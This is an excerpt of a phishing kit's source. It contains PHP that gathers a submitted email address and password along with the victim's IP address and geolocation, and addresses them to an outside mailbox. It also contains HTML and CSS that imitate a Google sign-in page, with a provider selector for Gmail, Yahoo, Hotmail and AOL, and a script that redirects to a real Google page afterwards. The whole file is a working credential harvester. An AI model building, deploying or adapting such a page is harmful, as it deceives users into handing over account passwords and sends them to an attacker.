...
$message .= "-------==Google==-------\n";
$message .= "EM: " . $_POST['Email'] . "\n"; 
$message .= "Psd: " . $_POST['Passwd'] . "\n"; 
$message .= "IP : " .$ip. "\n"; 
$message .= "City: {$geoplugin->city}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "-------==Google==-------\n";
$to = "ellenraham@outlook.com"; 
...
<script type="text/javascript"> 
<!-- 
   window.location="https://tools.google.com/dlpage/drive"; 
...
<style>
  ...
  content: url(Check/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
...
<style>
  ...
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(Check/DXI1ORHCpsQm3Vp6mXoaTXhCUOGz7vYGh680lGh-uXM.woff) format('woff');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(Check/cJZKeOuBrn4kERxqtaUH3T8E0i7KZn-EPnyo3HZu7kw.woff) format('woff');
}
  </style>
  <style>
  h1, h2 {
...
<style>
 ...
 .jfk-tooltip-content p:last-child {
  ...
  background: url("Check/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
...
<link href="Valid/GeneralconstrumField.css" rel="stylesheet" type="text/css">
<link href="Valid/Generalconstrum.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="Check/favicon.ico" type="image/x-icon" />
<script src="Valid/GeneralconstrumField.js" type="text/javascript"></script>
<script src="Valid/Generalconstrum.js" type="text/javascript"></script>
  </head>
  ...
  <img src="Check/logo_strip.png" alt="Google" width="405" height="72" class="logo">
  </div>
  </div>
...
<img class="profile-img" src="Check/avatar_2x.png" alt="">
<!-- form submit start -->
			<form action="#" method="POST" autocomplete="OFF">
   <div><strong>Select your Email Provider</strong></div></br>
    <input type="hidden" name="hidCflag" id="hidCflag" value="" />
    <select class="cflagdd"><option value="0" data-imagesrc="Check/G10763T.png"
            data-description="Sign in with Gmail">Gmail</option>
        <option value="1" data-imagesrc="Check/Y6H0748H.png"
            data-description="Sign in with Yahoo">Yahoo</option>
        <option value="2"  data-imagesrc="Check/H210U89K.png"
            data-description="Sign in with Hotmail">Hotmail</option>
        <option value="3" data-imagesrc="Check/F7310901.png"
            data-description="Sign in with AOL">AOL</option>
        <option value="4" data-imagesrc="Check/email.png"
...
<img src="Check/logo_strip_2x.png" width="420" height="32" alt="">
</div>
  </div>
  ...
  <label for="lang-chooser"><img src="Check/universal_language_settings-21.png" alt="Change language"></label>
  ...
  <script type="text/javascript" src="Check/jquery.min.js"></script>
  <script type="text/javascript" src="Check/jquery.ddslick.min.js"></script>
